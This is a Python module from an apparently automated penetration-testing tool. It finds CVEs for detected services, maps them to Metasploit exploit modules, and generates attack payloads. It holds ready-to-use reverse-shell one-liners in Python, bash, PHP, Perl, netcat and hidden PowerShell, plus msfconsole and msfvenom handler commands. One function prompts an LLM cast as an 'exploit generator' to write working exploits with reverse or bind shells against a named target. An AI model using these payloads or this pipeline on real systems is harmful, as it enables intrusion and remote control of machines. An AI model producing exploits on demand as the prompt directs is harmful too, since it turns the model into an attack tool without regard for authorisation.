import re, json, requests, subprocess, os, shlex
from datetime import datetime
from bs4 import BeautifulSoup
from ddgs import DDGS

from db import get_connection, add_scan_event

CVE_CACHE = {}
PAYLOAD_TEMPLATES = {}

PAYLOAD_TEMPLATES = {
    "python_reverse_shell": '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''',
    "bash_reverse_shell": 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    "php_reverse_shell": 'php -r \'$s=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "perl_reverse_shell": 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}\'',
    "nc_mkfifo": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f',
    "powershell_reverse": 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
}

METASPLOIT_FAST_TRACK = {
    "vsftpd_234": {"module": "exploit/unix/ftp/vsftpd_234_backdoor", "ports": [21], "service": "ftp", "version_contains": "2.3.4"},
    "unreal_ircd": {"module": "exploit/unix/irc/unreal_ircd_3281_backdoor", "ports": [6667, 8067, 6660], "service": "irc", "version_contains": "3.2.8.1"},
    "samba_usermap": {"module": "exploit/multi/samba/usermap_script", "ports": [139, 445], "service": "samba"},
    "distcc_exec": {"module": "exploit/unix/misc/distcc_exec", "ports": [3632], "service": "distcc"},
    "tomcat_mgr": {"module": "exploit/multi/http/tomcat_mgr_upload", "ports": [8080, 8443], "service": "tomcat"},
    "php_cgi": {"module": "exploit/multi/http/php_cgi_arg_injection", "ports": [80, 443, 8080], "service": "http"},
    "jenkins": {"module": "exploit/multi/http/jenkins_script_console", "ports": [8080, 8443], "service": "jenkins"},
    "mysql_auth_bypass": {"module": "auxiliary/server/mysql_auth_bypass", "ports": [3306], "service": "mysql"},
    "postgres_auth_bypass": {"module": "auxiliary/server/postgres_auth_bypass", "ports": [5432], "service": "postgresql"},
}

def web_search_cve(query: str, max_results: int = 5) -> list:
    results = []
    try:
        with DDGS() as ddgs:
            for r in ddgs.text(f"{query} CVE exploit", max_results=max_results):
                results.append({"title": r["title"], "url": r["href"], "snippet": r["body"]})
    except Exception as e:
        results.append({"error": str(e)})
    return results

def search_exploitdb(query: str) -> list:
    results = []
    try:
        result = subprocess.run(["searchsploit", "--json", query], capture_output=True, text=True, timeout=30)
        if result.returncode == 0 and result.stdout.strip():
            data = json.loads(result.stdout)
            results = data.get("RESULTS_EXPLOIT", [])[:5]
    except Exception:
        try:
            r = requests.get(f"https://www.exploit-db.com/search?q={query}", timeout=15,
                headers={"User-Agent": "Mozilla/5.0"})
            if r.ok:
                soup = BeautifulSoup(r.text, "html.parser")
                for item in soup.select(".search-result h2 a")[:5]:
                    results.append({"title": item.text.strip(), "url": f"https://www.exploit-db.com{item['href']}"})
        except Exception:
            pass
    return results

def search_nvd(cve_id: str) -> dict:
    if cve_id in CVE_CACHE:
        return CVE_CACHE[cve_id]
    try:
        r = requests.get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}", timeout=15)
        if r.ok:
            data = r.json()
            vuln = data.get("vulnerabilities", [{}])[0].get("cve", {})
            metrics = vuln.get("metrics", {})
            cvss_score = None
            severity = None
            for version in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                if version in metrics:
                    cvss = metrics[version][0].get("cvssData", {})
                    cvss_score = cvss.get("baseScore")
                    severity = cvss.get("baseSeverity")
                    break
            descriptions = [d["value"] for d in vuln.get("descriptions", []) if d.get("lang") == "en"]
            result = {
                "cve_id": cve_id,
                "cvss_score": cvss_score,
                "severity": severity,
                "description": descriptions[0] if descriptions else "",
                "published": vuln.get("published"),
                "references": [r["url"] for r in vuln.get("references", [])[:5]],
            }
            CVE_CACHE[cve_id] = result
            return result
    except Exception:
        pass
    return {"cve_id": cve_id, "error": "No se pudo obtener información del CVE"}

def detect_cves(service: str, version: str, port: str = "") -> list:
    results = []
    query = f"{service} {version} exploit".strip()
    if version:
        search_results = web_search_cve(f"{service} {version} CVE vulnerability")
    else:
        search_results = web_search_cve(f"{service} vulnerability exploit")
    cve_pattern = re.compile(r"CVE-\d{4}-\d{4,7}", re.IGNORECASE)
    seen_cves = set()
    for sr in search_results:
        combined = f"{sr.get('title', '')} {sr.get('snippet', '')}"
        found_cves = cve_pattern.findall(combined)
        for cve in found_cves:
            if cve.upper() not in seen_cves:
                seen_cves.add(cve.upper())
                info = search_nvd(cve.upper())
                info["source"] = sr.get("url", "")
                info["match_context"] = combined[:200]
                results.append(info)
    for edb in search_exploitdb(query):
        combined = edb.get("title", "")
        found_cves = cve_pattern.findall(combined)
        for cve in found_cves:
            if cve.upper() not in seen_cves:
                seen_cves.add(cve.upper())
                info = search_nvd(cve.upper())
                info["source"] = edb.get("url", "")
                results.append(info)
    return results

def find_msf_module(service: str, port: str, version: str = "") -> list:
    matches = []
    port = str(port).strip()
    service_lower = service.lower()
    for name, config in METASPLOIT_FAST_TRACK.items():
        if port and config.get("ports") and port in [str(p) for p in config["ports"]]:
            matches.append(config)
        elif service_lower == config.get("service", ""):
            matches.append(config)
        elif version and config.get("version_contains") and config["version_contains"] in version:
            matches.append(config)
    return matches

def generate_payload(tool: str, target: str, lhost: str, lport: int = 4444) -> dict:
    payloads = {
        "msf_reverse_meterpreter": f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'",
        "msf_reverse_shell": f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD cmd/unix/reverse_netcat; set LHOST {lhost}; set LPORT {lport}; run'",
        "msf_staged_payload": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/payload.elf",
    }
    for name, code in PAYLOAD_TEMPLATES.items():
        payloads[name] = code.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
    return payloads

def generate_exploit_code(cve_info: dict, target: str, lhost: str, lport: int = 4444, language: str = "python") -> str:
    cve_id = cve_info.get("cve_id", "")
    desc = cve_info.get("description", "")
    prompt = f"""Genera un exploit en {language} para {cve_id}.
Target: {target}
LHOST: {lhost}
LPORT: {lport}
Descripción: {desc}

Requisitos:
- Debe ser un script funcional y autónomo en {language}
- Debe incluir un reverse shell o bind shell
- Manejo de errores básico
- Timeout de conexión
- Debe parametrizar target, LHOST, LPORT

Devuelve SOLO el código, sin explicaciones ni markdown."""
    try:
        from llm_config import load_llm_config, run_llm_chat
        config = load_llm_config()
        response = run_llm_chat([
            {"role": "system", "content": "Eres un generador de exploits. Devuelve SOLO código válido sin explicaciones."},
            {"role": "user", "content": prompt},
        ], config)
        code_match = re.search(r"```(?:\w+)?\s*([\s\S]*?)```", response)
        if code_match:
            return code_match.group(1).strip()
        return response.strip()
    except Exception as e:
        template = PAYLOAD_TEMPLATES.get(f"{language}_reverse_shell") or PAYLOAD_TEMPLATES.get("python_reverse_shell", "")
        code = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
        return f"# Auto-generated from {cve_id}\n# LHOST={lhost} LPORT={lport}\n{code}"

def auto_exploit_pipeline(target: str, service: str, version: str, port: str, scan_id: str, lhost: str, lport: int = 4444) -> dict:
    result = {
        "target": target,
        "service": service,
        "version": version,
        "port": port,
        "cves_found": [],
        "msf_modules": [],
        "payloads": {},
        "exploit_code": "",
        "error": None
    }
    try:
        cves = detect_cves(service, version, port)
        result["cves_found"] = cves
        if cves:
            result["exploit_code"] = generate_exploit_code(cves[0], target, lhost, lport)
        msf_mods = find_msf_module(service, port, version)
        result["msf_modules"] = msf_mods
        if msf_mods:
            result["payloads"] = generate_payload("msf", target, lhost, lport)
        if scan_id:
            add_scan_event(scan_id, "cve_analysis", f"CVE scan for {service}:{port}",
                json.dumps({"cves": len(cves), "msf": len(msf_mods)}, indent=2), "cve_intel")
    except Exception as e:
        result["error"] = str(e)
        if scan_id:
            add_scan_event(scan_id, "cve_error", f"CVE error {service}:{port}", str(e), "cve_intel")
    return result

def save_payload_to_db(target: str, scan_id: str, cve_id: str, language: str, code: str, title: str = "") -> int:
    from db import save_exploit_artifact
    return save_exploit_artifact(
        target=target,
        scan_id=scan_id,
        title=title or f"Auto-exploit {cve_id}",
        cve=cve_id,
        language=language,
        filename=f"exploit_{cve_id.replace('-','_').lower()}.{language}",
        code=code,
        status="generated",
    )
